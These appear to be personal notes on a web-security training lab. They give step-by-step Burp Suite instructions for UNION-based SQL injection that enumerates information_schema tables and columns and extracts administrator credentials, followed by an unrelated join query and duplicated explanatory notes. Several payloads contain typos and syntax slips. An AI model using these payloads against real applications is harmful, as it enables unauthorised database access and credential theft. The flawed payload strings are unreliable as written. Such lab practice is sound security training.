


                     LAB #8 SQL injection attack, listing the database contents on non-Oracle databases

                     STEPS TO REPRODUCE
                    1. Configure your browser with proxy tool such as Burp Suite
                    2. Turn on the intercept in Burp Suite
                    3. In the Browser click on corporate gifts 
                    4. Send the intercepted request to Repeater
                    5. In the request change the category=' and observe the response 
                       it's 500 Internal server error, it suggest that there is sql injection vulnerability.
                    6. Replace the payload category=' with category='+UNION+SELECT+'abc','def'--
                    7. Observe the response it's 200 OK which suggest that the table has two columns
                    8. Replace the payload with category='+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
                    9. In the resonse search for users and note down the user_table name.
                   10. Now Look for the column names in the users table.
                       for that replace the payload with category='+UNION+SELECT+column_name,+NULL+FROM+information_schema.colums+
                       where+table_name='users'--
                   11. In the response observe that application responded with username and password column name.
                   12. Replace the payload with category='+UNION+SELECT+username+password+from+'user'--
                   13. In the response observe that server responded with administrator username and password
                   14. Login in the application with administrator username and password 



 select employees.employee_id,employees.employee_name,departments.department_name from
    employees
    LEFT JOIN departments ON employees.department_id = departments.department_id
    UNION
    select employees.employee_id,employees.employee_name,departments.department_name from
    employees
    RIGHT JOIN departments ON employees.department_id = departments.department_id
    where
    employees.department_id IS NULL or departments.department_id IS NULL;



*** WARNING ***

personal NOTES

Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. 
This provides information about the database.

For example, you can query information_schema.tables to list the tables in the database:
SELECT * FROM information_schema.tables

This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE

This output indicates that there are three tables, called Products, Users, and Feedback.

You can then query information_schema.columns to list the columns in individual tables:
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar

This output shows the columns in the specified table and the data type of each column. 
















NOTES :-

                                                        ***warning***
                                                        THis is for personal reference only


Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides 
information about the database.

For example, you can query information_schema.tables to list the tables in the database:
SELECT * FROM information_schema.tables

This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE

This output indicates that there are three tables, called Products, Users, and Feedback.

You can then query information_schema.columns to list the columns in individual tables:
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar

This output shows the columns in the specified table and the data type of each column. 